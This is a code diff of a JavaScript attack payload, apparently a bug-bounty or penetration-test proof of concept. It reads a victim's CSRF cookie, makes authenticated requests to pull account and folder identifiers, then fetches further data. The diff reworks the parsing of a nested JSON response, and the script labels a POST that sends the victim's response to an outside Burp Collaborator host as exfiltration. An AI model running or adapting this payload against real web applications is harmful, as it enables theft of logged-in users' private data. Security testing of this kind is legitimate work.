@@ -6,7 +6,7 @@ function getCookie(name) {
     return null;
 }
 
-// FIX: Initialize and assign the variable before checking it in the 'if' condition
+// Initialize and assign the variable before checking it
 var csrfToken = getCookie("zmcsr");
 
 if (csrfToken) {
@@ -23,10 +23,18 @@ if (csrfToken) {
             var firstResponse = postReq.responseText;
             
             try {
-                // Parsing assuming the server responds with a valid JSON string
-                var jsonResponse = JSON.parse(firstResponse);
-                var val1 = jsonResponse.accId; 
-                var val2 = jsonResponse.fId;
+                // 1. Parse the top-level outer array response
+                var outerArray = JSON.parse(firstResponse);
+                
+                // 2. Access index 1 of the array to get the object, then grab the 'user.uiState' string
+                var uiStateString = outerArray[1].user.uiState;
+                
+                // 3. Parse the inner serialized string back into a JSON object
+                var innerObj = JSON.parse(uiStateString);
+                
+                // 4. Navigate down the nested path to extract param1 and param2
+                var val1 = innerObj.state.data.app.data.accId;
+                var val2 = innerObj.state.data.app.data.listing.view.fId;
 
                 if (val1 && val2) {
                     // === REQUEST 2: GET from target endpoint using parameters ===
@@ -42,7 +50,7 @@ if (csrfToken) {
 
                             // === REQUEST 3: POST exfiltration to Burp Collaborator ===
                             var exfilReq = new XMLHttpRequest();
-                            exfilReq.open("POST", "https://whhmrffjfe5xbeih0rm0gl1qyh4as1gq.oastify.com", true);
+                            exfilReq.open("POST", "https://oastify.com", true);
                             exfilReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                             
                             // Send the second response text inside the post body parameter
@@ -51,10 +59,10 @@ if (csrfToken) {
                     };
                     secondReq.send();
                 } else {
-                    console.error("Required parameters (accId or fId) were missing from the first response.");
+                    console.error("Required parameters (param1 or param2) were missing from the parsed structure.");
                 }
             } catch (e) {
-                console.error("Error parsing the first response as JSON:", e);
+                console.error("Error handling or double-parsing the first response:", e);
             }
         }
     };
